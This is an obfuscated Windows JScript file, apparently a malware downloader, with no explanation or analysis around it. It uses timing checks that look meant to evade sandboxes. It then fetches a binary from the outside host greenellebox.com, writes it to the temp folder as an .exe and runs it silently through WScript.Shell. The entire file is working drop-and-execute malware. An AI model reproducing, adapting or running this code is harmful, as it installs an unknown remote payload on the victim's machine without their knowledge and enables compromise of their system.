var d1 = false;
var yS = "CreateObject";
var u = function p() {return WScript[yS]("WScript.Shell");}(), d0 = 11;
var Z0 = "MSXML2.XMLHTTP";
var r = 2123213;
var DO = 0;
function iZ(xb){u["Run"](xb, DO, DO);};
function wv(){return "" + Z0;};
function c(h, Xr){DO = DO * 1; return h - Xr;};
function v(){return yS;};
/*@cc_on
  @if (@_win32 || @_win64)
    d1 = true;
  @end
@*/
if (d1)
{
var pp = "";
function pH(){return 22;};
var l = 0; var Im = 0;
function dP()
{
var Y = new this["Date"]();
var Tn = Y["getUTCMilliseconds"]();
WScript["Sleep"](pH());
var Y = new this["Date"]();
var jP = Y["getUTCMilliseconds"]();
WScript["Sleep"](pH());
var Y = new this["Date"]();
var hH = Y["getUTCMilliseconds"]();
var l = "p0";
l = c(jP, Tn);
var Im = "iK";
Im = c(hH, jP);
pp = "open";
return c(l, Im);
}
var M = false;
var Vp = false;
for (var d = DO; d < pH() * 1; d++){if (dP() != DO){
M = true; 
Im = "31" + 11 * l + Im; 
Vp = true; 
break;
}}
function e() {return ((M == true) && (M == Vp)) ? 1 : DO;};
if (M && e() && Vp){
function Zl() {return u["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2pxsE88R.exe";};
 J = wv();
 fO = WScript[yS](J);
 var YY = 1;
 while (YY){
try {
fO[pp]("GET", "http://greenellebox.com/a1odk", false);
fO["send"]();
C = "Sleep";
for (;;){WScript[C](pH() * 11); if (fO["readystate"] >= 2 * 2) break;};
YY = DO;
} catch(Te){};
}
function Z(Xg) {var E = (1, 2, 3, 4, 5, Xg); return E;};
il = WScript[v()]("ADODB.Stream");
J = il;
J[pp]();
J["type"] = Z(1);
J["write"](fO["ResponseBody"]);
il["position"] = Z(DO);
J["Save" + "ToFile"](Zl(), 2);
il["c"+"lose"]();
F = Zl();
iZ(F);
}
}

